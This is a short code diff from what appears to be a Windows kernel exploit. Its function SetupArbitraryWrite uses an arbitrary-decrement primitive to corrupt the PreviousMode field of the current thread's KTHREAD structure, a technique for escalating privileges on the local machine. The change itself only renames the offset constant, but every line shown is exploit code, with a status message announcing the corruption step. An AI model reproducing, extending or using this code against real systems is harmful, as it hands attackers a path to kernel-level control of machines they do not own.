@@ -12,7 +12,7 @@
 int SetupArbitraryWrite(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
 {
     // Target PreviousMode field of KTHREAD structure
-    uintptr_t addr_to_decrement = addrs->self_kthread + KTHREAD_PREVIOUS_MODE_OFFSET;
+    uintptr_t addr_to_decrement = addrs->self_kthread + KTHREAD_PreviousMode_OFFSET;
 
     puts("[*] Executing arbitrary decrement to modify PreviousMode");
     if (!ArbitraryDecrement(pipes, addrs, addr_to_decrement))
